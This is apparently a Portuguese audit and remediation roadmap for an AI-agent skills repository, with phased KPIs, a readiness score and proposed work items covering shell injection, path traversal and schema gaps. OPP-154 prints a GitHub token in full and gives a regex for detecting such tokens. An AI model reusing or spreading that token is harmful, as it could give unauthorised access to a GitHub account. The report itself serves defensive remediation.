| <Cenário crítico> | <Ação de recuperação imediata> | <Para quem escalar> |
| <Cenário moderado> | <Ação de recuperação> | Retry automático |
| <Cenário leve> | <Degradação graciosa> | Continuar com warning |
```

---

## Métricas de Sucesso

### KPIs por Fase

**Fase 1 — Remediações de Segurança (1-2 dias)**

| KPI | Baseline | Target | Medição |
|-----|---------|--------|---------|
| Shell injection críticas abertas | 2 | 0 | Grep `shell=True` + `eval_cmd` |
| Token hardcoded em código | 1 | 0 | `secret-scanner.js` + grep `ghp_` |
| Scripts com path traversal | 30+ | 0 | Grep `open(args.input)` sem `resolve()` |
| CI/CD bloqueia `security:` ausente em AGENT.md com Bash | 0% | 100% | Teste do validador |

**Fase 2 — Normalização de Schema (1-2 semanas)**

| KPI | Baseline | Target | Medição |
|-----|---------|--------|---------|
| SKILL.md com `executor:` preenchido | 7% (298/3.889) | ≥95% | `tools/validate_skills.py` |
| SKILL.md com `skill_id:` | 58% (2.259/3.889) | ≥95% | Grep `skill_id:` |
| AGENT.md com `security:` | 4,2% (9/215) | ≥80% | Grep em agents/ |
| Agentes fantasma no pipeline base | 4 | 0 | Verificação manual dos 4 AGENT.md |
| Agentes não registrados no boot | 163 | 0 | Diff roster vs disco |
| Scripts com cabeçalho APEX | 0% | 100% | `tools/validate_skills.py` (atualizado) |

**Fase 3 — Disambiguation e Qualidade (2-4 semanas)**

| KPI | Baseline | Target | Medição |
|-----|---------|--------|---------|
| SR_40 compliance (`## Why This Skill Exists`) | 0,13% (5/3.889) | ≥50% skills top-500 | Grep seção |
| Descriptions com verbo imperativo | 72% | ≥95% | Grep pattern `^[A-Z][a-z]+ ` |
| Input_schema com trigger concreto | <6% | ≥60% | Grep `<describe your request>` (deve ser 0) |
| Skills com `synergy_map` real (não boilerplate) | ~5% | ≥30% | Inspeção por amostragem |
| Skills órfãs sem `anchors:` | 31% (1.159) | <10% | Grep ausência de campo |
| Duplicatas `skill-creator` | 14 | 1 canônica + aliases | Grep nome |

**Fase 4 — Super-Skills Compostas (1-2 meses)**

| KPI | Baseline | Target | Medição |
|-----|---------|--------|---------|
| Super-skills PROPOSED implementadas | 0 | 10 | Count status ADOPTED em tier SUPER |
| Domínios com pipeline end-to-end declarativo | 1 (engineering_agentops) | ≥8 | Verificação cross_domain_bridges |
| Cobertura de testes em scripts críticos | 1% (6/589) | ≥20% | `pytest --co` em skills/ |
| Anchors com ruído lexical | ~60% do corpus | <5% | Grep anchors fora do vocabulário canônico |
| Domínios sem agente especializado crítico | 3 (i18n, observability, privacy) | 0 | Verificação de AGENT.md |

**Score Global de Super-Skill Readiness**

```
Score = (executor_filled% × 0.20) 
      + (sr40_compliance% × 0.20)
      + (security_field% × 0.15)
      + (concrete_triggers% × 0.15)
      + (pipeline_coverage_domains × 0.15)
      + (test_coverage_scripts% × 0.15)

Baseline v00.36.0: ~18/100
Target Fase 2:     ~45/100
Target Fase 3:     ~70/100  
Target Fase 4:     ~90/100  ← "Super-Skill Ready"
```

---

## Próximos OPPs Recomendados (OPP-153+)

Ordenados por impacto × urgência. Cada OPP segue o formato APEX: problema → solução → esforço → FMEA mínimo → executor.

---

### OPP-153: Remediação de Shell Injection Crítica
**Tipo**: SECURITY_FIX | **Urgência**: IMEDIATA | **Tier**: CORE
**Problema**: R-01/R-02 — `eval_cmd + shell=True` em `run_experiment.py` e `result_ranker.py` (4 arquivos, 2 cópias cada).
**Solução**: Substituir por allowlist de comandos permitidos + `shlex.split()`. Se pipes forem necessários, exigir approval gate do usuário.
**Esforço**: 2–4h | **Executor**: Manual (engenheiro)
**FMEA**: Probabilidade de exploração: média (requer acesso ao ambiente). Severidade: crítica (RCE). Detecção: grep `shell=True` automatizado. Mitigação: PR bloqueado por CI se padrão reaparecer.
**Rollback**: Git revert. Zero breaking change na interface da skill.

---

### OPP-154: Revogar Token GitHub + Sanitizar Fixtures de Teste
**Tipo**: SECURITY_FIX | **Urgência**: IMEDIATA | **Tier**: ADAPTED
**Problema**: R-05 — Token `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` em `sanitizer.test.ts:248`.
**Solução**: (1) Verificar e revogar token no GitHub. (2) Substituir por `ghp_EXAMPLE_TOKEN_FOR_TESTING_ONLY`. (3) Adicionar regra no `secret-scanner.js` para bloquear padrão `ghp_[a-zA-Z0-9]{36}` em fixtures.
**Esforço**: 30min | **Executor**: Manual
**FMEA**: Se token ainda ativo: acesso não autorizado à API GitHub. Detecção: `secret-scanner.js` já tem o padrão.

---

### OPP-155: Script `tools/infer_executor.py` — Preenchimento em Massa de `executor:`
**Tipo**: NORMALIZATION | **Urgência**: ALTA | **Tier**: ADAPTED
**Problema**: executor ausente em 93% das skills (3.591 arquivos) — bloqueador crítico para routing.
**Solução**: Script de inferência baseado em domínio + presença de `scripts/`. Dry-run com relatório antes de aplicar. Patch atômico por domínio para facilitar revisão.
**Esforço**: 4h script + 4h validação por amostragem | **Executor**: `tools/infer_executor.py`
**FMEA**: Inferência incorreta → skill despachada com executor errado. Mitigação: revisão por amostragem (10%) por domínio antes de commit. Rollback: git revert por domínio.

---

### OPP-156: Criar 4 AGENT.md para Agentes Fantasma do Pipeline Base
**Tipo**: CRITICAL_GAP | **Urgência**: ALTA | **Tier**: CORE
**Problema**: `theorist`, `event_observer`, `meta_learning_agent`, `programme_director` declarados no kernel.agent_roster mas sem AGENT.md. `theorist` é STEP intermediário no pipeline base.
**Solução**: Criar 4 AGENT.md seguindo padrão de `anchor_destroyer.md`. `theorist`: gerador de hipóteses entre `architect` e `engineer`, tier 1, `activates_in: [DEEP, RESEARCH, SCIENTIFIC]`.
**Esforço**: 4h por agente (total 16h) | **Executor**: Arquiteto APEX (manual de alta precisão)
**FMEA**: AGENT.md incompleto → pipeline base com comportamento não-determinístico. Mitigação: simulação do pipeline com cada agente antes de promover para ACTIVE.

---

### OPP-157: Registrar 163 Agentes no Boot (subagents + cs_*)
**Tipo**: ROSTER_GAP | **Urgência**: ALTA | **Tier**: ADAPTED
**Problema**: 140 community-subagents e 23 cs_* existem em disco mas nunca são ativados por meta_reasoning (não estão no roster).
**Solução**: Adicionar seções `subagent_roster` e `business_persona_roster` no boot com `activates_when` por categoria. Mapeamento: categoria → domínios de ativação.
**Esforço**: 8h (mapeamento) + 4h (edição do master) | **Executor**: OPP aplicado ao master
**FMEA**: Ativação de agente inadequado para o contexto → ruído no pipeline. Mitigação: `activates_when` restritivo por categoria, `MAX 2 community agents` mantido.

---

### OPP-158: Patch em Massa de `security:` em AGENT.md (206 arquivos)
**Tipo**: NORMALIZATION | **Urgência**: ALTA | **Tier**: ADAPTED
**Problema**: 206/215 AGENT.md sem campo `security:`. Agentes com `tools: [Bash, Write, WebFetch]` sem declaração de limites.
**Solução**: Script `tools/patch_agent_security.py` que injeta `security:` com valores conservadores por padrão: `data_access: restricted`, `injection_risk: low`, `mitigation: ["Inputs validados antes de execução"]`.
**Esforço**: 4h script + revisão | **Executor**: `tools/patch_agent_security.py`
**FMEA**: Valor default incorreto → falsa sensação de segurança. Mitigação: revisão manual obrigatória para agentes com `tools: [Bash]`.

---

### OPP-159: Script de Geração de `## Why This Skill Exists` em Lote
**Tipo**: QUALITY | **Urgência**: MÉDIA-ALTA | **Tier**: ADAPTED
**Problema**: SR_40 compliance de 0,13% (7 arquivos). A seção mais importante para disambiguation semântica está quase ausente.
**Solução**: Script que usa LLM batch para gerar `## Why This Skill Exists` a partir de: `purpose:` existente OR primeiro parágrafo do corpo OR description. Priorizar top-500 skills por frequência de uso.
**Esforço**: 1 semana (batch + validação) | **Executor**: Script + LLM batch (Claude API)
**FMEA**: Seção "why" gerada incorretamente → pior que a ausência. Mitigação: revisão humana de 10% por domínio; marcar como `generated: true` para permitir auditoria futura.

---

### OPP-160: Normalização de `input_schema` — Substituir 2.590 Placeholders
**Tipo**: QUALITY | **Urgência**: MÉDIA-ALTA | **Tier**: ADAPTED
**Problema**: `<describe your request>` como trigger em 2.590 skills torna o routing LLM cego.
**Solução**: LLM batch extrai 3-5 triggers concretos do corpo de cada skill. Template de saída: `triggers: ["verbo objeto", "outro trigger"]`. Aplicar por domínio em ordem de prioridade.
**Esforço**: 1-2 semanas | **Executor**: Script + LLM batch
**FMEA**: Triggers incorretos → routing para skill errada. Mitigação: validação automática que rejeita triggers com menos de 3 palavras ou que replicam a description literal.

---

### OPP-161: Consolidação das 841 Skills Composio em Meta-Skill Parametrizada
**Tipo**: DEDUPLICATION | **Urgência**: MÉDIA | **Tier**: ADAPTED
**Problema**: 841 arquivos quase idênticos (`Automate [X] tasks via Rube MCP`) inflam o índice 22% e dificultam routing.
**Solução**: Criar `skills/integrations/composio/SKILL.md` como meta-skill com `parameter: toolkit_name`. 841 atuais viram stubs de ~5 linhas com `extends:` + `parameter:`.
**Esforço**: 3 dias | **Executor**: Script `tools/composio_consolidate.py`
**FMEA**: Stub sem `extends:` correto → skill inacessível. Mitigação: validação de referência antes de remover original.

---

### OPP-162: Biblioteca Base `skills/_shared/apex_script_base.py`
**Tipo**: REFACTOR | **Urgência**: MÉDIA | **Tier**: CORE
**Problema**: ~140 scripts repetem o mesmo boilerplate (argparse + json + Path + datetime + logging). Zero rastreabilidade skill_id em cabeçalhos.
**Solução**: Criar `skills/_shared/apex_script_base.py` com: argparse helper, JSON-I/O contract, logging padrão, detecção automática de `skill_id` a partir do caminho, `what_if_fails` handler.
**Esforço**: 1 semana | **Executor**: Engenheiro (script de alta reusabilidade)
**FMEA**: Dependência de `_shared/` quebra scripts isolados. Mitigação: script é opt-in, não obrigatório nas primeiras versões. Módulo standalone sem deps externas.

---

### OPP-163: Criar Domínio `engineering_mlops` com 5 Skills Core
**Tipo**: NEW_DOMAIN | **Urgência**: MÉDIA | **Tier**: ADAPTED
**Problema**: Gap crítico — `ai_ml_ml` tem treinamento de modelos, `engineering_devops` tem CI/CD, mas não há bridge MLOps.
**Solução**: Criar `skills/engineering_mlops/` com 5 skills: `model-deployment`, `drift-monitor`, `ab-test-ml`, `model-registry`, `feature-store-manager`. Agente `mlops-engineer` existe em community-subagents mas sem skills para invocar.
**Esforço**: 2 semanas | **Executor**: Arquiteto APEX + OPP por skill
**FMEA**: Skills MLOps sem infra → ficam como `LLM_BEHAVIOR` placeholder. Mitigação: implementar como HYBRID com scripts de referência mesmo sem infra real.

---

### OPP-164: Criar Agentes para 3 Gaps Críticos de Domínio
**Tipo**: NEW_AGENT | **Urgência**: MÉDIA | **Tier**: ADAPTED
**Problema**: `i18n-engineer` (zero cobertura), `observability-engineer` (SRE tangencia mas não cobre OpenTelemetry/Prometheus), `privacy-engineer` (compliance-auditor é genérico demais).
**Solução**: Criar 3 AGENT.md seguindo template community-subagents com capabilities granulares e `activates_when` específico. OPP-157 como pré-requisito (registro no boot).
**Esforço**: 4h por agente (total 12h) | **Executor**: Manual
**FMEA**: Agente novo sem skills para invocar → apenas LLM_BEHAVIOR. Mitigação: criar pelo menos 3 skills por agente em conjunto com o AGENT.md.

---

### OPP-165: Implementar Top-10 Super-Skills (SS-01 a SS-10)
**Tipo**: SUPER_SKILL | **Urgência**: BAIXA (depende Fases 1-3) | **Tier**: CORE
**Problema**: Zero super-skills existem; pipeline APEX é de skills isoladas.
**Solução**: Implementar as 10 super-skills descritas neste relatório seguindo o Template Canônico. Ordem de prioridade: SS-01 (full_dev_cycle) → SS-02 (secure_delivery) → SS-10 (skill_quality_lifecycle) → demais.
**Esforço**: 4-6 semanas total (1 OPP por super-skill) | **Executor**: Arquiteto APEX
**Pré-requisitos**: OPP-155 (executor em massa), OPP-159 (SR_40), OPP-160 (triggers), OPP-162 (biblioteca base).
**FMEA**: Super-skill com skills componentes sem `skill_id` correto → refs quebradas. Mitigação: verificar existência de cada `ref:` em `synergy_map` antes de promover super-skill para ACTIVE.

---

*Relatório master gerado em 2026-04-17 a partir de 5 análises independentes cobrindo 3.889 SKILL.md, 215 AGENT.md, ~2.960 scripts executáveis, e 52 domínios do APEX super-repo v00.36.0.*

*Próxima revisão recomendada: após conclusão da Fase 2 (normalização de schema) — Score Global de Super-Skill Readiness esperado de 18 → 45.*
